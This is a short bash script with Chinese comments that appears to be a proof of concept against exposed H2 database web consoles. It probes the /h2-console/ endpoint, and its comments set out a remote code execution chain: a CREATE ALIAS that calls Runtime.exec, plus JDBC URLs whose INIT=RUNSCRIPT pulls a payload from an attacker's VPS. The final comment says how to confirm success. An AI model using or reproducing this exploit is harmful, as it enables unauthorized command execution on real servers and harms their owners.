#!/usr/bin/env bash
TARGET="${1:?usage: bash h2.sh http://TARGET:8080 <VPS>}"
VPS="${2:?usage: bash h2.sh http://TARGET:8080 <VPS>}"
B="${TARGET%/}"
curl -sS -m 10 -o runs/h2.html -w 'console=%{http_code}\n' "$B/h2-console/"
# VPS 上准备远程 SQL：/poc.sql 内容可为
#   CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : ""; }';
#   CALL EXEC('id');
# 目标侧 JDBC URL（手工在 console 里填）：
#   jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://<VPS>/poc.sql'
#   jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) ...
# 判定：console 能连上且执行 CALL 有回显；无回显时看 VPS 是否收到 /poc.sql 请求
